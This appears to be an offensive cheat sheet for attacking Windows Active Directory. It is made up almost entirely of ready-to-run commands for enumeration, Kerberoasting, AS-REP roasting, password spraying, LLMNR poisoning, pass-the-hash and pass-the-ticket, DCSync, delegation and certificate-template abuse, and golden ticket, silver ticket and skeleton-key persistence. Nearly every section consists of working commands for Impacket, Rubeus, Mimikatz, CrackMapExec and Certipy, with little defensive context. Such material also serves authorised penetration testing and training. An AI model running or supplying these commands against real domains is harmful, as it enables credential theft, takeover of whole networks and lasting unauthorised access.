# Active Directory Attack Techniques

## Enumeration

### Initial Enumeration
```powershell
# Domain info
Get-ADDomain
Get-ADForest
Get-ADDomainController -Filter *

# Users
Get-ADUser -Filter * -Properties *
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} # Kerberoastable

# Groups
Get-ADGroup -Filter * | select Name
Get-ADGroupMember "Domain Admins" -Recursive

# Computers
Get-ADComputer -Filter * -Properties *
```

### LDAP Enumeration
```bash
# Anonymous bind
ldapsearch -x -H ldap://DC_IP -b "DC=domain,DC=local"

# Authenticated
ldapsearch -x -H ldap://DC_IP -D "user@domain.local" -w password -b "DC=domain,DC=local"
```

## Credential Attacks

### Kerberoasting
Request service tickets, crack offline.
```bash
# Impacket
GetUserSPNs.py domain.local/user:password -dc-ip DC_IP -request

# Rubeus
.\Rubeus.exe kerberoast /outfile:hashes.txt

# Crack with hashcat
hashcat -m 13100 hashes.txt wordlist.txt
```

### AS-REP Roasting
Target accounts without pre-authentication.
```bash
# Impacket
GetNPUsers.py domain.local/ -usersfile users.txt -dc-ip DC_IP -format hashcat

# Rubeus
.\Rubeus.exe asreproast /outfile:asrep.txt

# Crack
hashcat -m 18200 asrep.txt wordlist.txt
```

### Password Spraying
```bash
# CrackMapExec
crackmapexec smb DC_IP -u users.txt -p 'Spring2024!' --continue-on-success

# Kerbrute
kerbrute passwordspray -d domain.local users.txt 'Spring2024!'
```

### LLMNR/NBT-NS Poisoning
```bash
# Start Responder
sudo responder -I eth0 -wrf

# Crack captured hashes
hashcat -m 5600 hashes.txt wordlist.txt
```

## Lateral Movement

### Pass the Hash
```bash
# Impacket
psexec.py -hashes :NTLM_HASH domain/user@TARGET
wmiexec.py -hashes :NTLM_HASH domain/user@TARGET
smbexec.py -hashes :NTLM_HASH domain/user@TARGET

# CrackMapExec
crackmapexec smb TARGET -u user -H NTLM_HASH -x "whoami"
```

### Pass the Ticket
```bash
# Export ticket (Mimikatz)
sekurlsa::tickets /export

# Use ticket (Linux)
export KRB5CCNAME=ticket.ccache
psexec.py -k -no-pass domain.local/user@TARGET
```

### Overpass the Hash
```bash
# Rubeus
.\Rubeus.exe asktgt /user:USER /rc4:NTLM_HASH /ptt

# Mimikatz
sekurlsa::pth /user:USER /domain:DOMAIN /ntlm:HASH /run:cmd
```

## Privilege Escalation

### DCSync
Requires: Replicating Directory Changes (All)
```bash
# Mimikatz
lsadump::dcsync /domain:domain.local /user:Administrator

# Impacket
secretsdump.py domain/user:password@DC_IP
```

### Delegation Attacks

#### Unconstrained Delegation
```bash
# Find computers with unconstrained delegation
Get-ADComputer -Filter {TrustedForDelegation -eq $true}

# Capture TGT when privileged user connects
# Use Rubeus monitor or Mimikatz
```

#### Constrained Delegation
```bash
# Find users/computers with constrained delegation
Get-ADObject -Filter {msDS-AllowedToDelegateTo -ne "$null"}

# Request ticket and impersonate
.\Rubeus.exe s4u /user:SERVICE /rc4:HASH /impersonateuser:Administrator /msdsspn:SERVICE/TARGET /ptt
```

#### Resource-Based Constrained Delegation (RBCD)
```bash
# If you can write to msDS-AllowedToActOnBehalfOfOtherIdentity
# Create computer account, set RBCD, impersonate
```

### ADCS Attacks

#### ESC1 - Misconfigured Certificate Templates
```bash
# Find vulnerable templates
certipy find -u user@domain.local -p password -dc-ip DC_IP

# Request certificate as another user
certipy req -u user@domain.local -p password -ca CA-NAME -template TEMPLATE -upn administrator@domain.local
```

### Group Policy Abuse
```bash
# If you can edit GPO linked to privileged users
# Add user to local admins, add startup script, etc.
```

## Persistence

### Golden Ticket
Requires: KRBTGT hash
```bash
# Mimikatz
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /krbtgt:HASH /ptt
```

### Silver Ticket
Requires: Service account hash
```bash
kerberos::golden /user:Administrator /domain:DOMAIN.LOCAL /sid:S-1-5-21-... /target:SERVER /service:HTTP /rc4:HASH /ptt
```

### Skeleton Key
```bash
# Inject into LSASS on DC
misc::skeleton
# Now any user can auth with "mimikatz" as password
```

### AdminSDHolder
Modify AdminSDHolder ACL - propagates to all protected groups hourly.

### DCShadow
Register rogue DC to push malicious changes.

## Tools Summary
- **Impacket**: Python AD toolkit
- **Rubeus**: Kerberos attacks
- **Mimikatz**: Credential extraction
- **BloodHound**: Attack path analysis
- **CrackMapExec**: Swiss army knife
- **Certipy**: ADCS attacks
- **PowerView**: PowerShell enumeration
